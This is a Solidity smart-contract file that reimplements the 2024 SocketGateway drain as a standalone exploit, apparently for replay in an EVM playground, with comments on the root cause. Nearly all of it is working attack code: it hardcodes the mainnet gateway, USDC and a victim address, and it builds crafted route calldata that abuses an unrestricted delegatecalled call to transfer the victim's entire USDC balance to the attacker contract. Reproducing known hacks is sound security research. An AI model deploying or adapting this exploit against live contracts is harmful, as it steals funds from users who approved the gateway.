// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2024-01-SocketGateway).
// The DeFiHackLabs PoC runs the attack INLINE in the Foundry test contract
// (SocketGatewayExp IS the attacker — `address(this)` receives the drained
// USDC directly, there is no separate exploit contract deployed by the test).
// This contract is a faithful, self-contained copy of that inline attack
// (testExploit -> gateway.executeRoute(406, routeData)) so the playground can
// deploy it and record run(). Logic and constants are copied verbatim from
// test/SocketGateway_exp.sol.
//
// Root cause: SocketGateway.executeRoute() delegatecalls into route 406
// (WrappedTokenSwapperImpl), whose ERC20 branch does an unrestricted
// `fromToken.call(swapExtraData)`. Because the route runs via delegatecall,
// that call executes as the gateway itself, so an attacker-crafted
// `USDC.transferFrom(victim, attacker, victimBalance)` spends the victim's
// standing approval to the gateway. Setting `amount = 0` neutralizes the only
// guard, which compares the gateway's native ETH balance delta to `amount`.

interface ISocketGateway {
    function executeRoute(uint32 routeId, bytes calldata routeData) external payable returns (bytes memory);
}

interface ISocketVulnRoute {
    function performAction(
        address fromToken,
        address toToken,
        uint256 amount,
        address receiverAddress,
        bytes32 metadata,
        bytes calldata swapExtraData
    ) external payable returns (uint256);
}

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transferFrom(address, address, uint256) external returns (bool);
}

contract SocketGatewayDrain {
    address constant GATEWAY = 0x3a23F943181408EAC424116Af7b7790c94Cb97a5;
    address constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address constant TARGET_USER = 0x7d03149A2843E4200f07e858d6c0216806Ca4242;
    uint32 constant ROUTE_ID = 406; // Recently added vulnerable route id

    ISocketGateway constant gateway = ISocketGateway(GATEWAY);
    IERC20 constant usdc = IERC20(USDC);

    // the route's ERC20 branch ends with `payable(receiverAddress).transfer(amount)`
    // (amount = 0, but .transfer still requires the recipient to accept ETH with its
    // 2300-gas stipend) — mirrors the original test contract's `receive() {}`.
    receive() external payable {}

    // step 0: build the crafted route calldata and fire executeRoute() — the whole
    // attack is a single call, no capital and no prior approval from the attacker.
    function run() external {
        gateway.executeRoute(ROUTE_ID, getRouteData(USDC, TARGET_USER));
        require(usdc.balanceOf(address(this)) > 0, "no usdc gotten");
    }

    // the ERC20 payload the route forwards verbatim as `fromToken.call(swapExtraData)`:
    // pulls the victim's entire USDC balance to this contract, spending the
    // *gateway's* approval (the call executes with msg.sender == gateway via delegatecall).
    function getCallData(address token, address user) internal view returns (bytes memory callDataX) {
        require(IERC20(token).balanceOf(user) > 0, "no amount of usdc for user");
        callDataX = abi.encodeWithSelector(IERC20.transferFrom.selector, user, address(this), IERC20(token).balanceOf(user));
    }

    // the crafted performAction() call: fromToken = toToken = USDC (call target),
    // amount = 0 (neutralizes the ETH-delta guard and makes the pull/refund no-ops),
    // swapExtraData = the arbitrary transferFrom payload above.
    function getRouteData(address token, address user) internal view returns (bytes memory callDataX2) {
        callDataX2 = abi.encodeWithSelector(
            ISocketVulnRoute.performAction.selector,
            token,
            token,
            0,
            address(this),
            bytes32(""),
            getCallData(USDC, user)
        );
    }
}
